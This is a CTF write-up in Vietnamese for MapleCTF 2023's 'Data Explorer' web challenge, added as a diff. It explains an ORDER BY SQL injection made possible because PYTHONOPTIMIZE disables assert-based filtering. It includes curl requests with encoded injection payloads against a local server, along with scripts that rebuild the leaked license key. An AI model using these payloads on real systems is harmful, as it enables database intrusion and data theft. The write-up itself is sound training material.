@@ -1,0 +1,126 @@
+---
+title: Data Explorer
+description: 'Date: July 4, 2023 1:00 PM (EDT)'
+date: 2026-01-03
+tags:
+  - writeup
+  - sqli
+  - file-upload
+category: web
+ctf_event: Mablectf2023
+draft: false
+---
+
+import Callout from '@/components/mdx/Callout.astro';
+
+Date: July 4, 2023 1:00 PM (EDT)
+Status: Not started
+
+## Summary
+
+<Callout type="note" title="Note">
+💡 SQLinjection, Use **order by**
+
+</Callout>
+
+## Description
+
+- Bài này, mình không làm được khi giải đang diễn ra. Sau khi, giải kết thúc mình đọc writeup và lưu lại theo cách hiểu của mình.
+
+## Analyst
+
+- Đầu tiên bài này, đọc src code có thể thấy ngay lỗ hổng SQLi tuy nhiên lại bị strict filter nên việc tấn công SQL là không thể.
+- Tuy nhiên, nếu đọc file [run.sh](http://run.sh) nhận thấy có **PYTHONOPTIMIZE=1 ? HIỂU LÀ GÌ?**
+
+![Untitled](/uploads/data-explorer/data-explorer/untitled.png)
+
+- Đọc qua thì có thể hiểu giá trị này sẽ disable assert trong python.
+
+![Untitled](/uploads/data-explorer/data-explorer/untitled-1.png)
+
+- Từ đấy ta có ý tưởng tấn công hàm filter_order khi không cần ASC, DESC.
+- Ý tưởng chính của bài này là ta sẽ sử dụng order by sort trên 1 additional column để xác định ký tự và trên 1 order để xác định vị trí trong key của license.
+  - Chẳng hạn như sau: ta có key là : abc
+  - Ta có table là:
+    | aaa | pos |
+    | --- | --- |
+    | a   | 1   |
+    | a   | 2   |
+    | a   | 3   |
+    | a   | 4   |
+    | a   | 5   |
+    | a   | 6   |
+  - Ta order by substr(’abc’ || key, 1),pos → thì mỗi giá trị sẽ được gán theo bảng chữ cái + key
+    | aaa | pos | addition col |
+    | --- | --- | ------------ |
+    | a   | 1   | a            |
+    | a   | 2   | b            |
+    | a   | 3   | c            |
+    | a   | 4   | a            |
+    | a   | 5   | b            |
+    | a   | 6   | c            |
+  - Sau đó nó sẽ được sort theo addition col, r sau đó sẽ sort theo pos → Từ đó ta sẽ có các ký tự tương ứng theo từng vị trí.
+    | aaa | pos | addition col |
+    | --- | --- | ------------ |
+    | a   | 1   | a            |
+    | a   | 4   | a            |
+    | a   | 2   | b            |
+    | a   | 5   | b            |
+    | a   | 3   | c            |
+    | a   | 6   | c            |
+
+## Exploit
+
+- Để nhận biết được ký tự nào khi sort ta sẽ cần thêm các row ‘0-9’ + ‘a-f’ → TỪ ĐÓ 1 file create của ta sẽ có 128 + 16 = 144 row.
+- generate file.txt
+
+```jsx
+with open("exploit.txt", "w+") as f:
+  f.write("aaa,pos\n")
+  for i in range(1,145):
+    f.write(f"a,{i}\n")
+```
+
+- Tối đa 1 query sẽ có 200 row mà key của cta là 256 ký tự. Ta cần thực hiện 2 query để có thể lấy hết được key. Tuy nhiên khi create bảng sẽ bị redirect và mất 1 query nên ta sẽ sử dụng curl, để k bị redirect.
+
+<Callout type="note" title="Note">
+💡 curl '[http://0.0.0.0:8000/view/686220e0-6aa2-47d2-849d-7cbc2b05799e](http://0.0.0.0:8000/view/686220e0-6aa2-47d2-849d-7cbc2b05799e)' --data-raw 'order-col=aaa&order-od=%2C+%28select+substr%28%270123456789abcdef%27+%7C%7C+substr%28key%2C%201%29%2C+pos%2C+1%29+from+license%29%2C+pos' > [x.in](http://x.in/)
+
+</Callout>
+
+<Callout type="note" title="Note">
+💡 curl '[http://0.0.0.0:8000/view/5e8196d3-36e2-405f-bc99-23976cb97845](http://0.0.0.0:8000/view/5e8196d3-36e2-405f-bc99-23976cb97845)' --data-raw 'order-col=aaa&order-od=%2C+%28select+substr%28%270123456789abcdef%27+%7C%7C+substr%28key%2C%20129%29%2C+pos%2C+1%29+from+license%29%2C+pos' > [x.in](http://x.in/)
+
+</Callout>
+
+- code để lấy key. Ý tưởng của code, vì sort theo các ký tự trc, sau đó mới đến số thứ tự, nên ta cần phải có 1 cách để nhận biết được ký tự nào với ký tự nào. Vì vậy ta sẽ up lên file 144 row thêm 16 ký tự để làm mốc. Dò theo từng mốc là xđinh được từng ký tự.
+
+```jsx
+import re
+data = open('x.in', 'r').read()
+pattern = r'<td>(\d+)</td>'
+test = matches = re.findall(pattern, data)
+poss = [int(x) for x in test]
+abc = '0123456789abcdef'
+print(len(abc))
+index = 0
+d = ['x']*128
+print(d)
+for pos in poss:
+    print(index, pos)
+    if index+1 == pos and index<=15:
+        index += 1
+    else:
+        d[pos-17] = abc[index-1]
+print("".join(d))
+
+#key: 36d35d32d1c43cfc1d3342d5992f0a9f6b1d32325fc9fb4c640c97ab81ad0b4df8b3232a37aa2aef5d04e501466fa04760fc3b2abf1a076215f8653bf830b568de0c7f103c05c23ca88ef88fb72eeb589ca824c428423a0c1dafffc87cd2d1621d8fcab51a376c9d97cb2016efa034d9ee9cc3f510652ab85ecf20816e0c5453
+
+# 36d35d32d1c43cfc1d3342d5992f0a9f6b1d32325fc9fb4c640c97ab81ad0b4df8b3232a37aa2aef5d04e501466fa04760fc3b2abf1a076215f8653bf830b568de0c7f103c05c23ca88ef88fb72eeb589ca824c428423a0c1dafffc87cd2d1621d8fcab51a376c9d97cb2016efa034d9ee9cc3f510652ab85ecf20816e0c5453
+```
+
+## Result
+
+## REF
+
+[MapleCTF 2023 - Data Explorer](https://zimzi.substack.com/p/maplectf-2023-data-explorer)
